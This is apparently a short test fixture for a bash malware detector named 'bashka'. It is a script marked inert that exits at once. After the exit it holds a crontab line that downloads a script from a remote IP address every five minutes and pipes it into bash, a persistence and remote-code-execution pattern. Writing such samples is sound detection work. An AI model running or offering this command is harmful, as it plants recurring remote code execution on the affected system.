#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
echo "*/5 * * * * curl -s http://45.9.148.37/b | bash" | crontab -
